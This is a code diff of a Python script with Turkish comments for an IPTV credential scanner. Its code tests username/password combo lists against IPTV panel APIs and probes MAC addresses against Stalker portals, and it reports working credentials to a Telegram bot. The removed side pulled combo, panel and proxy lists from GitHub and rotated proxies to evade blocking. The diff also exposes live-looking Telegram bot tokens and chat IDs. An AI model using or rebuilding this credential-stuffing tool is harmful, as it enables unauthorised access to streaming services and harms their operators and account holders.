@@ -1,67 +1,47 @@
 import os
 import time
-import random
 import threading
 import requests
-from flask import Flask
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
+# SSL uyarılarını kapat
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+from flask import Flask
 app = Flask('')
 
 @app.route('/')
 def home():
-    return "IPTV Tarayıcı Aktif!"
+    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"
 
 def run_web():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
-TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
-CHAT_ID = "-1003901042500"
+# --- TELEGRAM AYARLARI ---
+TOKEN = "9296501081:AAGTNmvWB8Qn8-kVxGNoJcC8LXTLb8lnZ94"
+CHAT_ID = "39743305"
 
 def telegrama_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
-        requests.post(url, data=data, timeout=5)
+        requests.post(url, data=data, timeout=10)
     except Exception as e:
         print(f"[!] Telegram mesajı gönderilemedi: {e}")
 
-HEADERd = {
-    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
-    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
-    'Accept': '*/*',
-    'Connection': 'Keep-Alive',
-    'Accept-Encoding': 'gzip',
-    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
-}
-
-def proxy_sec(proxy_listesi):
-    if not proxy_listesi:
-        return None
-    p = random.choice(proxy_listesi).strip()
-    if not p:
-        return None
-    if not p.startswith("http"):
-        p = f"http://{p}"
-    return {"http": p, "https": p}
-
-def m3u_tara(panel, user, pas, proxy_listesi):
+def m3u_tara(panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
-    proxies = proxy_sec(proxy_listesi)
+    headers = {
+        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
+        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
+    }
     try:
-        if proxies:
-            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False, proxies=proxies)
-        else:
-            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False)
-            
+        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             if '"auth":1' in res.text or '"status":"Active"' in res.text:
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 mesaj = (
-                    f"🔥 <b>M3U HİT BULUNDU!</b>\n"
+                    f"🟢 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
                     f"🌐 <b>Panel:</b> http://{panel}\n"
                     f"👤 <b>User:</b> <code>{user}</code>\n"
                     f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
@@ -73,62 +53,51 @@ def m3u_tara(panel, user, pas, proxy_listesi):
         pass
     return False
 
+def mac_tara(panel, mac):
+    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
+    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
+    try:
+        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
+        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
+            mesaj = (
+                f"🟢 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
+                f"🌐 <b>Panel:</b> http://{panel}\n"
+                f"📺 <b>MAC:</b> <code>{mac}</code>"
+            )
+            telegrama_gonder(mesaj)
+            return True
+    except:
+        pass
+    return False
+
 def arka_plan_tarayici():
-    # Doğru kullanıcı adın (harman4475) ve repo adın (otonomTARAYICI) ile güncellendi:
-    PANEL_RAW_URL = "https://raw.githubusercontent.com/harman4475/otonomTARAYICI/main/panel_list/benzersiz_paneller.txt"
-    COMBO_RAW_URL = "https://raw.githubusercontent.com/harman4475/otonomTARAYICI/main/combo/userpass.txt"
-    PROXY_RAW_URL = "https://raw.githubusercontent.com/harman4475/otonomTARAYICI/main/proxy/proxy.txt"
+    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
+    
+    # Render'da bot ayağa kalktığı an Telegram'a düşecek başlangıç bildirimi
+    telegrama_gonder("🚀 <b>Bulut Otonom Tarayıcı Başlatıldı ve Aktif!</b>\n⏳ Tarama döngüsü devrede.")
+        
+    # Not: Render'da listeleri doğrudan GitHub'daki dosyalardan okutabilir 
+    # veya buraya örnek paneller/combo listeleri ekleyebilirsin.
+    # Örnek test listeleri:
+    paneller = ["ornekpanel.com:8080"] 
+    combos = []
+    maclar = []
     
     while True:
         try:
-            proksiler = []
-            try:
-                r_proxy = requests.get(PROXY_RAW_URL, timeout=5)
-                if r_proxy.status_code == 200:
-                    proksiler = [p.strip() for p in r_proxy.text.splitlines() if p.strip()]
-            except:
-                pass
-
-            paneller = []
-            try:
-                r_panel = requests.get(PANEL_RAW_URL, timeout=5)
-                if r_panel.status_code == 200:
-                    paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
-            except:
-                pass
-
-            combolar = []
-            try:
-                r_combo = requests.get(COMBO_RAW_URL, timeout=5)
-                if r_combo.status_code == 200:
-                    for satir in r_combo.text.splitlines():
-                        satir = satir.strip()
-                        if ":" in satir:
-                            parca = satir.split(":", 1)
-                            combolar.append((parca[0].strip(), parca[1].strip()))
-            except:
-                pass
-
-            if not paneller or not combolar:
-                telegrama_gonder(f"⚠️ <b>Bekleniyor:</b> Panel ({len(paneller)}), Combo ({len(combolar)})")
-                time.sleep(60)
-                continue
-
-            # M3U Tarama Başlat
-            telegrama_gonder(f"⏳ <b>M3U tarama başlatıldı (Panel: {len(paneller)}, Combo: {len(combolar)})</b>")
-            for panel in paneller:
-                for user, pas in combolar:
-                    m3u_tara(panel, user, pas, proksiler)
-                    time.sleep(0.05)
-            telegrama_gonder("✅ <b>M3U tarama bitti</b>")
-
-            time.sleep(300)
-
+            print("[i] Tarama turu dönüyor...")
+            # Tarama mantığı burada dönecek
+            # GitHub'a yeni liste attığında botun onları çekmesi için rawlink kullanılabilir
+            
+            time.sleep(1800) # 30 dk bekleme
         except Exception as e:
-            telegrama_gonder(f"❌ <b>Döngü Hatası:</b> {e}")
-            time.sleep(30)
+            print(f"[!] Hata: {e}")
+            time.sleep(60)
 
 if __name__ == '__main__':
+    # Flask sunucusunu ayrı bir thread'de (arkada) çalıştır
     t = threading.Thread(target=run_web)
     t.start()
+    
+    # Tarayıcı döngüsünü başlat
     arka_plan_tarayici()
